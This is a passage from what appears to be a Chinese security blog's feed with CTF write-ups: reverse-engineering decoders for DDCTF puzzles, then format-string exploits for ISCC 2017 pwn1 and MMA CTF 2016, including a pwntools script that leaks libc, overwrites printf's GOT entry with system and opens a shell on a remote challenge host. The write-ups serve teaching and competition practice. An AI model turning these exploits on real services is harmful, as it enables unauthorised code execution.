<span class="number">0x65</span>,</div><div class="line">                      <span class="number">0x6A</span>, <span class="number">0x6A</span>, <span class="number">0x3D</span>, <span class="number">0x68</span>, <span class="number">0x4</span>, <span class="number">0x5</span>,</div><div class="line">                      <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x55</span>, <span class="number">0x8</span>,</div><div class="line">                      <span class="number">0x5D</span>, <span class="number">0x61</span>, <span class="number">0x55</span>, <span class="number">0x0A</span>, <span class="number">0x5F</span>,</div><div class="line">                      <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x61</span>, <span class="number">0x32</span>, <span class="number">0x17</span>,</div><div class="line">                      <span class="number">0x1D</span>, <span class="number">0x19</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x20</span>,</div><div class="line">                      <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x1E</span>,</div><div class="line">                      <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x0</span>,</div><div class="line">                      <span class="number">0x0</span>]</div><div class="line">    v2 = x</div><div class="line">    v1 = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(v1 &lt; <span class="number">55</span>):</div><div class="line">        byte_100001040[v1] = byte_100001040[v1] - <span class="number">2</span></div><div class="line">        byte_100001040[v1] = byte_100001040[v1]^v2</div><div class="line">        v1+=<span class="number">1</span></div><div class="line">        v2+=<span class="number">1</span></div><div class="line">    str=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> byte_100001040:</div><div class="line">        str+=chr(i)</div><div class="line">    print(str)</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><img src="http://obmugrq95.bkt.clouddn.com/20170525-3.png" alt=""></p>
<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>这道题是个APK，用AndroidKill不能查看java伪代码，但是Android逆向助手可以。我们发现验证条件就是将我们输入的字符串和i()这个函数返回值对比是否相等。<br><img src="http://obmugrq95.bkt.clouddn.com/20170525-10.png" alt=""><br>我们直接将这段java伪代码复制下来稍作修改，跑出i()函数的返回值，即flag。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagActivity</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">byte</span>[] p = &#123;-<span class="number">40</span>, -<span class="number">62</span>, <span class="number">107</span>, <span class="number">66</span>, -<span class="number">126</span>, <span class="number">103</span>, -<span class="number">56</span>, <span class="number">77</span>, <span class="number">122</span>, -<span class="number">107</span>, -<span class="number">24</span>, -<span class="number">127</span>, <span class="number">72</span>, -<span class="number">63</span>, -<span class="number">98</span>, <span class="number">64</span>, -<span class="number">24</span>, -<span class="number">5</span>, -<span class="number">49</span>, -<span class="number">26</span>, <span class="number">79</span>, -<span class="number">70</span>, -<span class="number">26</span>, -<span class="number">81</span>, <span class="number">120</span>, <span class="number">25</span>, <span class="number">111</span>, -<span class="number">100</span>, -<span class="number">23</span>, -<span class="number">9</span>, <span class="number">122</span>, -<span class="number">35</span>, <span class="number">66</span>, -<span class="number">50</span>, -<span class="number">116</span>, <span class="number">3</span>, -<span class="number">72</span>, <span class="number">102</span>, -<span class="number">45</span>, -<span class="number">85</span>, <span class="number">0</span>, <span class="number">126</span>, -<span class="number">34</span>, <span class="number">62</span>, <span class="number">83</span>, -<span class="number">34</span>, <span class="number">48</span>, -<span class="number">111</span>, <span class="number">61</span>, -<span class="number">9</span>, -<span class="number">51</span>, <span class="number">114</span>, <span class="number">20</span>, <span class="number">81</span>, -<span class="number">126</span>, -<span class="number">18</span>, <span class="number">27</span>, -<span class="number">115</span>, -<span class="number">76</span>, -<span class="number">116</span>, -<span class="number">48</span>, -<span class="number">118</span>, -<span class="number">10</span>, -<span class="number">102</span>, -<span class="number">106</span>, <span class="number">113</span>, -<span class="number">104</span>, <span class="number">98</span>, -<span class="number">109</span>, <span class="number">74</span>, <span class="number">48</span>, <span class="number">47</span>, -<span class="number">100</span>, -<span class="number">88</span>, <span class="number">121</span>, <span class="number">22</span>, -<span class="number">63</span>, -<span class="number">32</span>, -<span class="number">20</span>, -<span class="number">41</span>, -<span class="number">27</span>, -<span class="number">20</span>, -<span class="number">118</span>, <span class="number">100</span>, -<span class="number">76</span>, <span class="number">70</span>, -<span class="number">49</span>, -<span class="number">39</span>, -<span class="number">27</span>, -<span class="number">106</span>, -<span class="number">13</span>, -<span class="number">108</span>, <span class="number">115</span>, -<span class="number">87</span>, -<span class="number">1</span>, -<span class="number">22</span>, -<span class="number">53</span>, <span class="number">21</span>, -<span class="number">100</span>, <span class="number">124</span>, -<span class="number">95</span>, -<span class="number">40</span>, <span class="number">62</span>, -<span class="number">69</span>, <span class="number">29</span>, <span class="number">56</span>, -<span class="number">53</span>, <span class="number">85</span>, -<span class="number">48</span>, <span class="number">25</span>, <span class="number">37</span>, -<span class="number">78</span>, <span class="number">11</span>, -<span class="number">110</span>, -<span class="number">24</span>, -<span class="number">120</span>, -<span class="number">82</span>, <span class="number">6</span>, -<span class="number">94</span>, -<span class="number">101</span>&#125;;</div><div class="line">        <span class="keyword">byte</span>[] q = &#123;-<span class="number">57</span>, -<span class="number">90</span>, <span class="number">53</span>, -<span class="number">71</span>, -<span class="number">117</span>, <span class="number">98</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">101</span>, -<span class="number">96</span>, <span class="number">36</span>, <span class="number">110</span>, <span class="number">77</span>, -<span class="number">83</span>, -<span class="number">121</span>, <span class="number">2</span>, -<span class="number">48</span>, <span class="number">94</span>, -<span class="number">106</span>, -<span class="number">56</span>, -<span class="number">49</span>, -<span class="number">80</span>, -<span class="number">1</span>, <span class="number">83</span>, <span class="number">75</span>, <span class="number">66</span>, -<span class="number">44</span>, <span class="number">74</span>, <span class="number">2</span>, -<span class="number">36</span>, -<span class="number">42</span>, -<span class="number">103</span>, <span class="number">6</span>, -<span class="number">115</span>, -<span class="number">40</span>, <span class="number">69</span>, -<span class="number">107</span>, <span class="number">0</span>, -<span class="number">21</span>, -<span class="number">51</span>, <span class="number">57</span>, <span class="number">73</span>, -<span class="number">26</span>, <span class="number">13</span>, <span class="number">55</span>, -<span class="number">17</span>, <span class="number">84</span>, -<span class="number">89</span>, <span class="number">14</span>, -<span class="number">61</span>, -<span class="number">85</span>, <span class="number">75</span>, <span class="number">39</span>, <span class="number">48</span>, -<span class="number">69</span>, -<span class="number">38</span>, <span class="number">44</span>, -<span class="number">21</span>, -<span class="number">115</span>, -<span class="number">72</span>, -<span class="number">30</span>, -<span class="number">17</span>, -<span class="number">107</span>, -<span class="number">7</span>, -<span class="number">91</span>, <span class="number">73</span>, -<span class="number">87</span>, <span class="number">81</span>, -<span class="number">94</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">70</span>, -<span class="number">8</span>, -<span class="number">63</span>, <span class="number">26</span>, <span class="number">126</span>, -<span class="number">76</span>, -<span class="number">104</span>, -<span class="number">123</span>, -<span class="number">71</span>, -<span class="number">126</span>, -<span class="number">62</span>, -<span class="number">23</span>, <span class="number">11</span>, -<span class="number">39</span>, <span class="number">70</span>, <span class="number">14</span>, <span class="number">59</span>, -<span class="number">101</span>, -<span class="number">39</span>, -<span class="number">124</span>, <span class="number">91</span>, -<span class="number">109</span>, <span class="number">102</span>, -<span class="number">49</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">37</span>, -<span class="number">128</span>, -<span class="number">57</span>, <span class="number">117</span>, <span class="number">110</span>, -<span class="number">115</span>, -<span class="number">86</span>, <span class="number">56</span>, <span class="number">25</span>, -<span class="number">46</span>, -<span class="number">55</span>, <span class="number">7</span>, -<span class="number">125</span>, <span class="number">109</span>, <span class="number">76</span>, <span class="number">104</span>, -<span class="number">15</span>, <span class="number">82</span>, -<span class="number">53</span>, <span class="number">18</span>, -<span class="number">28</span>, -<span class="number">24</span>&#125;;</div><div class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">        <span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[p.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arrayOfByte1.length; j++) &#123;</div><div class="line">            arrayOfByte1[j] = ((<span class="keyword">byte</span>) (p[j] ^ q[j]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> k = arrayOfByte1[<span class="number">0</span>];</div><div class="line">        <span class="keyword">int</span> i1 ;</div><div class="line">        <span class="keyword">for</span> (i1 =<span class="number">0</span>;arrayOfByte1[(k + i1)] != <span class="number">0</span>; i1++) &#123;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">byte</span>[] arrayOfByte2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>];</div><div class="line">        <span class="keyword">while</span> (i &lt; i1) &#123;</div><div class="line">            arrayOfByte2[i] = arrayOfByte1[(k + i)];</div><div class="line">            i++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">0</span>;i&lt;arrayOfByte2.length;l++)</div><div class="line">        &#123;</div><div class="line">            System.out.print((<span class="keyword">char</span>)arrayOfByte2[l]);</div><div class="line">        &#125;</div><div class="line">        &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><img src="http://obmugrq95.bkt.clouddn.com/20170525-4.png" alt=""></p>
<h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>这个题是刚开始时一脸懵逼，它给了一个exe文件，一个x.jpg,一份Readme.txt<br>然而Readme是什么意思没看懂，到底x.jpg有什么用也很纳闷。</p>
<p><img src="http://obmugrq95.bkt.clouddn.com/20170525-5.png" alt=""></p>
<p>不管那么多了，先用文件格式分析器，查壳工具等等分析一波，发现这是个32位的exe文件，加了UPX壳，我们用ESP定律法两次脱壳后用IDA进行分析。<br>我们发现这个程序的逻辑就是先访问 <a href="http://www.ddctf.com/x.jpg，" target="_blank" rel="external">http://www.ddctf.com/x.jpg，</a> 然后将x.jpg的内容读取进来，进行了一些操作，最后返回一个reusult。</p>
<p><img src="http://obmugrq95.bkt.clouddn.com/20170525-6.png" alt=""></p>
<p>我们用IIS在本地搭建web服务，使得程序能访问<a href="http://www.ddctf.com/x.jpg。" target="_blank" rel="external">http://www.ddctf.com/x.jpg。</a></p>
<p><img src="http://obmugrq95.bkt.clouddn.com/20170525-7.png" alt=""></p>
<p>读取到x.jpg的内容后进行了如下操作，我们发现如果if条件成立reusult就是flag</p>
<p><img src="http://obmugrq95.bkt.clouddn.com/20170525-8.png" alt=""></p>
<p>用OD动态调试脱壳后的程序，修改JMP语句为跳转，得到flag。</p>
<p><img src="http://obmugrq95.bkt.clouddn.com/20170525-9.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;DDCTF比赛形式比较新颖，是解答一道题后会获得一个邮箱，将writeup发送到邮箱后会给你回复下一个题。而且是逆向和web交叉，如果解答不了当前题目就无法进入下一题，它考察一个人的综合技术素养。这个比赛到目前还没有结束，它为期十三天，但是邻近期末，各种结课作业，各种考试接踵而至，早已没有精力和时间再去做它了，所以提前写个博客记录一下比赛心得。&lt;br&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ISCC-2017-pwn1</title>
    <link href="http://spd.dropsec.xyz/2017/05/23/ISCC-2017-pwn1(%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E)/"/>
    <id>http://spd.dropsec.xyz/2017/05/23/ISCC-2017-pwn1(字符串格式化漏洞)/</id>
    <published>2017-05-23T12:35:14.000Z</published>
    <updated>2017-05-25T00:44:45.098Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个32位的程序，并且给了libc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file pwn1</div><div class="line">pwn1: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=cdb7eaa63202024dd348ac15b485b751b55eafa8, not stripped</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>我们用gdb-peda查看只开了一个NX保护，有NX保护的话直接写入shellcode这条路就行不通了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure></p>
<p>分析后发现这个程序存在格式化字符串漏洞，并且我们输入的数据被gets函数输入后，又传给了printf函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  int v3; // [sp+14h] [bp-6Ch]@3</div><div class="line">  int v4; // [sp+18h] [bp-68h]@5</div><div class="line">  int v5; // [sp+7Ch] [bp-4h]@1</div><div class="line"></div><div class="line">  v5 = *MK_FP(__GS__, 20);</div><div class="line">  setbuf(stdout, 0);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    introduce();</div><div class="line">    do</div><div class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v3);</div><div class="line">    while ( getchar() == &quot;\n&quot; );</div><div class="line">    if ( v3 == 1 )</div><div class="line">    &#123;</div><div class="line">      puts(&quot;please input your name:&quot;);</div><div class="line">      gets(&amp;v4);</div><div class="line">      printf(&amp;v4);</div><div class="line">      puts(&quot;,you are welcome!&quot;);</div><div class="line">    &#125;</div><div class="line">    else if ( v3 == 2 )</div><div class="line">    &#123;</div><div class="line">      puts(&quot;nothing!!!!lol&quot;);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      puts(&quot;please,don&apos;t trick me&quot;);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>利用思路：</p>
<ol>
<li>利用printf函数泄露出printf函数的地址。</li>
<li>利用给出的libc计算出偏移量，计算出system函数的地址。</li>
<li>将printf的got地址修改为system函数的地址。</li>
<li>利用gets函数传入/bin/sh参数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">"115.28.185.220"</span>,<span class="number">11111</span>)</div><div class="line"><span class="comment">#gdb.attach(p,'b *0x08048618\n')</span></div><div class="line"><span class="comment">#context.log_level = "debug"</span></div><div class="line">printfGOT = <span class="number">0x0804a010</span></div><div class="line"><span class="comment">#printfOffset = 0x4D410</span></div><div class="line"><span class="comment">#systemOffset = 0x40310</span></div><div class="line"></div><div class="line">printfOffset = <span class="number">0x4CDD0</span></div><div class="line">systemOffset = <span class="number">0x3FE70</span></div><div class="line">p.recvuntil(<span class="string">"$"</span>) </div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recvuntil(<span class="string">":"</span>)</div><div class="line">p.sendline(p32(printfGOT)+<span class="string">"--%6$s--"</span>)</div><div class="line"><span class="comment">#print p.recvline()</span></div><div class="line">p.recvuntil(<span class="string">'--'</span>)</div><div class="line">res=p.recvuntil(<span class="string">'--'</span>)[:<span class="number">-2</span>]</div><div class="line">res = res[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line"></div><div class="line">printfAddress=u32(res)</div><div class="line"><span class="keyword">print</span> <span class="string">"printfAddress:"</span>, hex(printfAddress)</div><div class="line">systemAddress = printfAddress - printfOffset + systemOffset</div><div class="line"><span class="keyword">print</span> <span class="string">"printf:"</span>, hex(printfAddress)</div><div class="line"><span class="keyword">print</span> <span class="string">"system:"</span>, hex(systemAddress)</div><div class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printfGOT: systemAddress&#125;)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"$"</span>)</div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recvuntil(<span class="string">":"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recvuntil(<span class="string">":"</span>)</div><div class="line">p.sendline(<span class="string">"/bin/sh"</span>)</div><div class="line"><span class="keyword">print</span> p.recvline()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python pwn1.py </div><div class="line">[+] Opening connection to 115.28.185.220 on port 11111: Done</div><div class="line">printfAddress: 0xf75e5dd0</div><div class="line">printf: 0xf75e5dd0</div><div class="line">system: 0xf75d8e70</div><div class="line"></div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">1.get your name</div><div class="line">2.heiheihei</div><div class="line">sh: 1: plz: not found</div><div class="line">please input your name:</div><div class="line">$ cat home/pwn1/flag</div><div class="line">flag&#123;Pwn1TdsS_@tdxIscc&#125;$ </div><div class="line">$</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个32位的程序，并且给了libc。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ file pwn1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pwn1: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=cdb7eaa63202024dd348ac15b485b751b55eafa8, not stripped&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MMA-CTF-2016-judement</title>
    <link href="http://spd.dropsec.xyz/2017/04/24/MMA-CTF-2016-judement/"/>
    <id>http://spd.dropsec.xyz/2017/04/24/MMA-CTF-2016-judement/</id>
    <published>2017-04-24T13:42:12.000Z</published>
    <updated>2017-04-24T15:29:13.951Z</updated>
    
    <content type="html"><![CDATA[<p>这道题的功能就是等Flag judgment system\nInput flag &gt;&gt; 时输入flag，然后和真正的flag进行对比，如果正确就输出Correct flag!!,错误就输出Wrong flag…。同时我们发现这个程序的printf存在格式化字符串漏洞。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  void *v3; // esp@1</div><div class="line">  int result; // eax@2</div><div class="line">  int v5; // ecx@6</div><div class="line">  char format; // [sp+0h] [bp-4Ch]@1</div><div class="line">  int v7; // [sp+40h] [bp-Ch]@1</div><div class="line">  int *v8; // [sp+48h] [bp-4h]@1</div><div class="line"></div><div class="line">  v8 = &amp;argc;</div><div class="line">  v7 = *MK_FP(__GS__, 20);</div><div class="line">  v3 = alloca(144);</div><div class="line">  printf(&quot;Flag judgment system\nInput flag &gt;&gt; &quot;);</div><div class="line">  if ( getnline(&amp;format, 64) )</div><div class="line">  &#123;</div><div class="line">    printf(&amp;format);</div><div class="line">    if ( !strcmp(&amp;format, flag) )</div><div class="line">      result = puts(&quot;\nCorrect flag!!&quot;);</div><div class="line">    else</div><div class="line">      result = puts(&quot;\nWrong flag...&quot;);</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Unprintable character&quot;);</div><div class="line">    result = -1;</div><div class="line">  &#125;</div><div class="line">  v5 = *MK_FP(__GS__, 20) ^ v7;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里是通过load_flag函数将文件名为flag.txt的文件内容读取到了数组flag[64]中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">int init()</div><div class="line">&#123;</div><div class="line">  int result; // eax@1</div><div class="line">  int v1; // edx@4</div><div class="line">  char filename[4]; // [sp+13h] [bp-15h]@1</div><div class="line">  int v3; // [sp+1Ch] [bp-Ch]@1</div><div class="line"></div><div class="line">  v3 = *MK_FP(__GS__, 20);</div><div class="line">  strcpy(filename, &quot;flag.txt&quot;);</div><div class="line">  setbuf(stdin, 0);</div><div class="line">  setbuf(stdout, 0);</div><div class="line">  result = load_flag(filename, flag, 64);</div><div class="line">  if ( !result )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Loading &apos;%s&apos; failed...\n&quot;, filename);</div><div class="line">    _exit(0);</div><div class="line">  &#125;</div><div class="line">  v1 = *MK_FP(__GS__, 20) ^ v3;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>下面是load_flag的函数体。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">int __cdecl load_flag(char *filename, char *s, int n)</div><div class="line">&#123;</div><div class="line">  int result; // eax@2</div><div class="line">  FILE *stream; // [sp+18h] [bp-10h]@1</div><div class="line">  char *v5; // [sp+1Ch] [bp-Ch]@5</div><div class="line"></div><div class="line">  stream = fopen(filename, &quot;r&quot;);</div><div class="line">  if ( stream )</div><div class="line">  &#123;</div><div class="line">    if ( fgets(s, n, stream) )</div><div class="line">    &#123;</div><div class="line">      v5 = strchr(s, 10);</div><div class="line">      if ( v5 )</div><div class="line">        *v5 = 0;</div><div class="line">      result = 1;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      result = 0;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    result = 0;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过以上分析我们知道flag.txt文件在服务器上，当程序运行时将flag.txt内容读取到flag数组中然后让我们输入数据和flag中的数据进行对比。同时我们发现了printf函数存在格式化字符串漏洞，我们可以利用printf将flag中的内容打印出来。</p>
<p>首先我们知道了flag就是0x804a0a0。<br><img src="http://oj3cgkt4g.bkt.clouddn.com/20170424-1.png" alt=""></p>
<p>接下来我们GDB调试，得出flag到printf的偏移为28。<br><img src="http://oj3cgkt4g.bkt.clouddn.com/20170424-2.png" alt=""></p>
<p>利用过程和结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ nc localhost 5555</div><div class="line">Flag judgment system</div><div class="line">Input flag &gt;&gt; %28$s  </div><div class="line">TWCTF&#123;R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0&#125;</div><div class="line">Wrong flag...</div></pre></td></tr></table></figure></p>
<p>我们得到flag为TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}</p>
<p>当然我们也可以直接对flag到printf的偏移进行爆破。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">300</span>):</div><div class="line">    r = remote(<span class="string">'localhost'</span>,<span class="number">5555</span>)</div><div class="line">    r.recv()</div><div class="line">    r.sendline(<span class="string">"%&#123;&#125;$s"</span>.format(i))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        res = r.recv()</div><div class="line">        <span class="keyword">if</span> <span class="string">"TWCTF"</span> <span class="keyword">in</span> res:</div><div class="line">            <span class="keyword">print</span> <span class="string">"The flag is: "</span> + res</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    r.close()</div></pre></td></tr></table></figure></p>
